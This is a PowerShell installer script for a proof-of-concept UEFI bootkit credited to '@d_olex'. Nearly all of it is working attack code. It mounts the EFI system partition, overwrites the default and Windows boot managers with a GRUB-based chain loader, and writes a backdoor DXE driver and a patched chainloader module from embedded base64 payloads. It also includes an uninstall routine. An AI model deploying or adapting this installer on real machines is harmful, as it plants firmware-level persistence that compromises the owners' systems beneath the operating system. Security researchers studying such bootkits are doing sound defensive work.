
Function Extract-File
{
    param($Data, $Destination);

    # create output file
    $Output = $(New-Object System.IO.FileStream($Destination, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write));

    # decode base64 data
    $Stream = $(New-Object System.IO.MemoryStream(, [Convert]::FromBase64String($Data)));

    # decompress data
    $(New-Object System.IO.Compression.DeflateStream($Stream, [System.IO.Compression.CompressionMode]::Decompress)).CopyTo($Output);
    $Output.Close();
}

Function Delete-File
{
    param($Path);

    If (Test-Path $Path)
    {
        Write-Host ("Deleting {0}" -f $Path);

        # recursively delete specified item
        Remove-Item -Path $Path -ErrorAction Stop -Force -Recurse;
    }
}

Function Banner
{
    param($Color);

    $c = $host.ui.RawUI.ForegroundColor;    

    "                                                                    "
    "********************************************************************"
    "                                                                    "

    $host.ui.RawUI.ForegroundColor = $Color;

    "    _______                             ___ ___                     "
    "   |   |   |.--.--.-----.-----.----.___|   |   |                    "
    "   |       ||  |  |  _  |  -__|   _|___|   |   |                    "
    "   |___|___||___  |   __|_____|__|      \_____/                     "
    "            |_____|__|                                              "
    "                        ______               __   __     __ __      "
    "                       |   __ \.-----.-----.|  |_|  |--.|__|  |_    "
    "     PoC by @d_olex    |   __ <|  _  |  _  ||   _|    < |  |   _|   "
    "       (c) 2020        |______/|_____|_____||____|__|__||__|____|   "
    "                                                                    "

    $host.ui.RawUI.ForegroundColor = $c;

    "                                                                    "
    "********************************************************************"
    "                                                                    "    
}

Banner -Color "Magenta";

If (-not $Install -and -not $Uninstall)
{
    Write-Host "USAGE: .\installer.ps1 -Install";
    Write-Host "       .\installer.ps1 -Uninstall";
    Write-Host "";
    Exit;   
}

$Disk = 'S:';

# default EFI boot manager
$GrubPathDef = $Disk + "\EFI\Boot\fde_ld.efi";
$BootloaderPathDef = $Disk + "\EFI\Boot\bootx64.efi";
$BootloaderPathDefOrig = $Disk + "\EFI\Boot\bootx64_orig.efi";

# Windows EFI boot manager
$GrubPath = $Disk + "\EFI\Microsoft\Boot\fde_ld.efi";
$BootloaderPath = $Disk + "\EFI\Microsoft\Boot\bootmgfw.efi";
$BootloaderPathOrig = $Disk + "\EFI\Microsoft\Boot\bootmgfw_orig.efi";

# GRUB2 stuff
$GrubDir = $Disk + "\boot\grub";
$GrubCfgPath = $GrubDir + "\grub.cfg";
$GrubModPath = $GrubDir + "\chain.mod";

$BackdoorPath = $Disk + "\EFI\Microsoft\Boot\backdoor.efi";

# check for admin user
If (-not [bool]((whoami /groups) -match "S-1-16-12288"))
{
    Write-Host "ERROR: Administrator privileges required" -ForegroundColor Red;
    Write-Host ""
    Exit;
}

Write-Host ("Mounting EFI system partition at {0}" -f $Disk);

# mount EFI system partition
mountvol $Disk /S

If (-not (Test-Path $Disk))
{
    Write-Host "ERROR: Unable to mount EFI system partition" -ForegroundColor Red;
    Write-Host ""
    Exit;
}

If (Test-Path $BootloaderPath)
{
    If ($Install)
    {
        If (-not (Test-Path $BootloaderPathOrig))
        {
            Try 
            {
                #
                # Overwrite default EFI boot manager
                #

                Write-Host ("Saving default bootloader as {0}" -f $BootloaderPathDefOrig);

                # save original bootloader
                Copy-Item $BootloaderPathDef -Destination $BootloaderPathDefOrig -ErrorAction Stop -Force;

                Write-Host ("Writing first stage bootloader to the {0}" -f $BootloaderPathDef);

                # write first stage bootloader
                Extract-File -Data $Bootloader -Destination $BootloaderPathDef;

                Write-Host ("Writing second stage bootloader to the {0}" -f $GrubPathDef);

                # write second stage bootloader
                Extract-File -Data $Grub -Destination $GrubPathDef;

                #
                # Overwrite Windows EFI boot manager
                #

                Write-Host ("Saving Windows boot manager as {0}" -f $BootloaderPathOrig);

                # save original bootloader
                Copy-Item $BootloaderPath -Destination $BootloaderPathOrig -ErrorAction Stop -Force;

                Write-Host ("Writing first stage bootloader to the {0}" -f $BootloaderPath);

                # write first stage bootloader
                Extract-File -Data $Bootloader -Destination $BootloaderPath;

                Write-Host ("Writing second stage bootloader to the {0}" -f $GrubPath);

                # write second stage bootloader
                Extract-File -Data $Grub -Destination $GrubPath;

                Write-Host ("Writing backdoor DXE driver to the {0}" -f $BackdoorPath);

                # write backdoor driver
                Extract-File -Data $Backdoor -Destination $BackdoorPath;

                # create grub config directory
                New-Item -Path $GrubDir -ItemType Directory -ErrorAction Stop -Force | Out-Null;                

                Write-Host ("Writing bootloader config to the {0}" -f $GrubCfgPath);

                # write bootloader config
                Extract-File -Data $GrubCfg -Destination $GrubCfgPath;

                Write-Host ("Writing patched chainloader to the {0}" -f $GrubModPath);

                # write chainloader
                Extract-File -Data $GrubMod -Destination $GrubModPath;

                Write-Host "Bootkit was successfully installed" -ForegroundColor Green;
            }
            Catch 
            {
                Write-Host $_.ScriptStackTrace -ForegroundColor Red;
                Write-Host ("ERROR: " + $_) -ForegroundColor Red;
            }
        }
        else
        {
            Write-Host "Bootkit is already installed" -ForegroundColor Yellow;
        }
    }
    ElseIf ($Uninstall)
    {
        If (Test-Path $BootloaderPathOrig)
        {
            Try 
            {
                Write-Host ("Restoring default bootloader {0}" -f $BootloaderPathDef);

                # restore original bootloader
                Move-Item $BootloaderPathDefOrig -Destination $BootloaderPathDef -ErrorAction Stop -Force;

                Write-Host ("Restoring Windows boot manager {0}" -f $BootloaderPath);

                # restore original bootloader
                Move-Item $BootloaderPathOrig -Destination $BootloaderPath -ErrorAction Stop -Force;

                # perform cleanup
                Delete-File -Path $GrubDir;
                Delete-File -Path $GrubPath;
                Delete-File -Path $GrubPathDef;
                Delete-File -Path $BackdoorPath;

                Write-Host "Bootkit was successfully uninstalled" -ForegroundColor Green;
            }
            Catch 
            {
                Write-Host $_.ScriptStackTrace -ForegroundColor Red;
                Write-Host ("ERROR: " + $_) -ForegroundColor Red;
            }
        }
        else
        {
            Write-Host "Bootkit is not installed" -ForegroundColor Yellow;
        }   
    }
}
else
{
    Write-Host "ERROR: Unable to find Windows boot manager EFI application" -ForegroundColor Red;
}

# unmount EFI system partition
mountvol $Disk /D

Write-Host ""

